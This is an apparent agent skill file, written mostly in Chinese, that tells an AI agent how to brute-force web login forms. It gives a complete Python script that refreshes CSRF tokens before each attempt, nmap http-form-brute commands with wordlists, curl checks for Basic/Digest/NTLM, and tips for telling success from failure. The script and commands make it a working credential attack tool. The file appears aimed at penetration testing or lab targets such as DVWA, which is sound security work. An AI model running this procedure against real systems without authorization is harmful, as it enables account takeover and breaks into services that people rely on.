---
name: web-login-bruteforce
description: End-to-end procedure for brute-forcing an HTTP login surface from a raw request capture, a curl command, or just a login URL — extracting and refreshing CSRF/one-time tokens, keeping the session, handling form-encoded vs JSON bodies, fingerprinting the failure signal, and choosing between nmap http-form-brute and a purpose-built curl/python script. Use when the target of the credential attack is a web form, JSON API, or HTTP auth header (Basic/Digest/NTLM). Do not use it for non-HTTP services (see password-attack) or when the login flow requires solving a CAPTCHA or a hardware second factor.
license: MIT
compatibility: Requires a filesystem-based agent with bash, curl, and Python 3 (stdlib only; requests is not installed). nmap 7.93 with NSE scripts is available. chromium is available for JS-driven flows.
allowed-tools: Bash Read Write Edit Glob Grep
metadata:
  user-invocable: "false"
---

# Web 登录爆破

## 一、从材料提取认证要素

材料可能是原始 HTTP 报文、curl 命令或一个登录 URL。目标是把材料变成一份**可重放的请求模板**，不要重新猜端点。

从原始报文里要提取：方法、路径、Host、`Content-Type`、请求体字段名、以及是否带 CSRF 隐藏字段。

```bash
# 只有登录 URL 时，先把表单结构抓下来
curl -sS -c jar.txt http://TARGET/login.php -o login.html
grep -oE '<form[^>]*>' login.html
grep -oE '<input[^>]*>' login.html
```

看 `action`、`method`、每个 `input` 的 `name`。隐藏字段通常是 `user_token` / `csrf_token` / `_token` / `authenticity_token` 之类，**它每次请求都会变**。

## 二、CSRF / 一次性 token（Web 爆破最容易翻车的地方）

带一次性 token 的表单，**每次尝试前都要重新 GET 登录页取新 token，并携带同一会话 Cookie 提交**。用固定 token 循环提交会得到整片假失败。

```python
#!/usr/bin/env python3
"""带 CSRF 刷新的 Web 登录爆破骨架（python3 stdlib，无需第三方库）。"""
import http.cookiejar, re, sys, urllib.parse, urllib.request

BASE = "http://TARGET"
LOGIN = f"{BASE}/login.php"
USER_FIELD, PASS_FIELD, TOKEN_FIELD = "username", "password", "user_token"
SUCCESS_REDIRECT = "/index.php"          # 成功信号：跳转目标
FAILURE_MARKERS = ("Login failed", "用户名或密码错误")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
TOKEN_RE = re.compile(r"name=['\"]" + TOKEN_FIELD + r"['\"]\s+value=['\"]([^'\"]+)['\"]")

def fresh_token():
    html = opener.open(LOGIN, timeout=10).read().decode("utf-8", "replace")
    match = TOKEN_RE.search(html)
    return match.group(1) if match else None

def attempt(user, password):
    token = fresh_token()
    body = {USER_FIELD: user, PASS_FIELD: password, "Login": "Login"}
    if token:
        body[TOKEN_FIELD] = token
    data = urllib.parse.urlencode(body).encode()

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *args, **kwargs):
            return None

    req = urllib.request.Request(LOGIN, data=data)
    try:
        resp = opener.open(req, timeout=10)
        status, location, text = resp.status, resp.headers.get("Location", ""), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        status, location, text = err.code, err.headers.get("Location", ""), err.read().decode("utf-8", "replace")
    except Exception as err:               # 连接层失败也要当作本轮信号，不要静默跳过
        print(f"[net] {user}:{password} -> {err}")
        return False
    hit = SUCCESS_REDIRECT in location and not any(m in text for m in FAILURE_MARKERS)
    print(f"[try] {user}:{password} status={status} loc={location or '-'} len={len(text)} hit={hit}")
    return hit

if __name__ == "__main__":
    user, words = sys.argv[1], [line.strip() for line in open(sys.argv[2], encoding="utf-8") if line.strip()]
    for password in words:
        if attempt(user, password):
            print(f"[HIT] {user}:{password}")
            break
```

先跑 **2 次**（一条已知错误 + 一条已知正确，如果你有）确认脚本能区分成功与失败，再放开字典。不要直接跑完整字典。

## 三、会话与 Cookie

- 用 Cookie jar 保持会话（curl 的 `-c/-b`，或 python 的 `http.cookiejar`）。
- 不要跨尝试复用陈旧的会话状态；验证码、锁定计数、token 都可能绑定在会话上。
- `curl` 默认跟随重定向会让 `-w '%{http_code}'` 报最终状态码而掩盖 302 的成功信号。要么用 `-D -` 看原始响应头，要么显式禁用跟随（python 里覆盖 `redirect_request` 返回 `None`）。

## 四、请求体形态

| 形态 | 构造 |
|---|---|
| 表单 | `application/x-www-form-urlencoded`，`curl -d 'user=a&pass=b'` |
| JSON API | `curl -H 'Content-Type: application/json' -d '{"username":"a","password":"b"}'`；python 用 `json.dumps` |
| GraphQL | `POST` + `{"query":"...","variables":{...}}` |
| Basic / Digest / NTLM | `curl -u user:pass --basic|--digest|--ntlm`，或 `nmap --script http-brute` |

## 五、nmap http-form-brute 与自建脚本的分工

**适用 `nmap --script http-form-brute`**：表单字段固定、**没有一次性 token**、字段名已知。

已核实的可用参数（nmap 7.93）：

```bash
nmap -Pn -p 80 --script http-form-brute \
  --script-args userdb=users.txt,passdb=passwords.txt,\
http-form-brute.path=/login.php,\
http-form-brute.method=POST,\
http-form-brute.uservar=username,http-form-brute.passvar=password,\
http-form-brute.onsuccess='Welcome',\
http-form-brute.sessioncookies=PHPSESSID=abc123,\
brute.threads=4,brute.delay=500ms \
  TARGET
```

关键点：

- `userdb` / `passdb` 来自 `brute` 库，**一行一个**，直接明文写的凭据。
- `http-form-brute.uservar` / `.passvar` 指明账号与口令字段名；两者都给出时不再自动探测表单。
- `http-form-brute.onsuccess` / `.onfailure` 是**响应体里的字符串或 Lua 模式**，决定脚本如何判定。不给出时脚本依赖表单自动探测，判定容易出错——**只要你能观察到成功页特征，就显式给出 `onsuccess`**。
- `http-form-brute.hostname` 用于虚拟主机；`brute.delay` / `brute.threads` 控制节奏。
- **没有参数可以刷新一次性 CSRF token**。`sessioncookies` 只能固定一份 Cookie，不能每次重取 token。带 token 的表单必须改用脚本。

**必须自建脚本**：带一次性 token、JSON 体、多步登录、需要按响应差异聚类判定、需要按响应时间做限速反馈。

## 六、Basic / Digest / NTLM

```bash
curl -sS -o /dev/null -w '%{http_code}\n' -u admin:wrong --basic http://TARGET/admin/
curl -sSI http://TARGET/ | grep -i '^www-authenticate'      # 先确认机制
```

HTTP 认证头没有会话概念，判定信号就是状态码（200 vs 401），可以做得很干净；但同样受锁定与限速约束，先探测再放量。

## 七、SPA 与前端签名

先用浏览器观察真实请求，再回到脚本复现：

```bash
chromium --headless --disable-gpu --no-sandbox \
  --dump-dom http://TARGET/login 2>/dev/null | head -50
```

不要凭猜测复现前端加密/签名逻辑。若签名算法无法在预算内复现，如实报告这不是"字典问题"而是"需要逆向前端"的边界。

## 八、命中验证与判定陷阱

- **不要只看状态码**。DVWA、phpMyAdmin 之类的失败登录常常也返回 302。
- 判定优先用：成功页才出现的字段 / 重定向目标 / 新增认证 Cookie，至少两个信号一致。
- 命中后用一条只读请求确认已认证会话（例如 `GET /index.php` 并检查页面出现用户名），不要执行任何写操作。
- 把**失败基线**与**命中响应**两份原文都留成证据。

## 九、这个环境里没有的工具

`hydra`、`medusa`、`ncrack`、`patator`、`ffuf`、`gobuster`、`wfuzz` **都不存在**。不要生成会因命令缺失而失败的计划；Web 侧一律走 `nmap` NSE 或 `curl` / `python3 stdlib`。
